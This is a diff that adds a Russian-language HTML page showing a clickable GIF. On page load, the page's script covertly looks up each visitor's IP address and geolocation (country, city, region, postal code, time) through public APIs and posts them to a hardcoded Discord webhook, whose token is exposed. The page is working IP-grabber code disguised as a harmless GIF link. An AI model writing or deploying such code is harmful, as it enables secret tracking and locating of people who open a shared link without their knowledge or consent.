@@ -1,0 +1,101 @@
+﻿<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Отправка информации в Discord Webhook</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+
+        .gif-container {
+            text-align: center;
+        }
+
+            .gif-container img {
+                max-width: 100%;
+                height: auto;
+                cursor: pointer;
+            }
+    </style>
+</head>
+<body>
+    <div class="gif-container">
+        <a href="https://your-website.com" target="_blank" id="gif-link">
+            <img src="https://media.giphy.com/media/l0MYEbFG56s6wFz0Y/giphy.gif" alt="Random GIF">
+        </a>
+    </div>
+
+    <script>
+        // Получение IP-адреса
+        async function getIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        // Получение данных о местоположении (страна, город, адрес)
+        async function getLocation(ip) {
+            const response = await fetch(`https://ipapi.co/${ip}/json/`);
+            const data = await response.json();
+            return {
+                country: data.country_name,
+                city: data.city,
+                region: data.region,
+                region_code: data.region_code,
+                postal: data.postal,
+                address: `${data.city}, ${data.region}, ${data.country_name}`,
+                timezone: data.timezone
+            };
+        }
+
+        // Получение текущего времени
+        function getCurrentTime(timezone) {
+            const date = new Date().toLocaleString("en-US", { timeZone: timezone });
+            return date;
+        }
+
+        // Отправка данных в Discord Webhook
+        async function sendToDiscord(ip, country, city, region, postal, address, timezone, time) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1327336020831895646/bsReO3dbHVsYxDtvBxA1BvngXZMcZtvfQ0stIMOo3Xn-jGsFc0lB50o3-5kz1tEnSPWY';  // Пример прокси-сервиса
+
+            const message = {
+                content: `Новый пользователь с IP: ${ip}\nСтрана: ${country}\nГород: ${city}\nРегион: ${region}\nПочтовый индекс: ${postal}\nАдрес: ${address}\nВремя: ${time}`
+            };
+
+            // Отправка данных через прокси на Webhook
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message)
+            });
+
+            if (response.ok) {
+                console.log('Информация успешно отправлена в Discord');
+            } else {
+                console.error('Ошибка при отправке данных на сервер');
+            }
+        }
+
+        // Получение всех данных и отправка их в Discord
+        getIP().then(ip => {
+            getLocation(ip).then(location => {
+                const time = getCurrentTime(location.timezone);
+                sendToDiscord(ip, location.country, location.city, location.region, location.postal, location.address, location.timezone, time);
+            }).catch(err => {
+                console.error('Ошибка при получении данных о местоположении:', err);
+            });
+        }).catch(err => {
+            console.error('Ошибка при получении IP:', err);
+        });
+    </script>
+</body>
+</html>
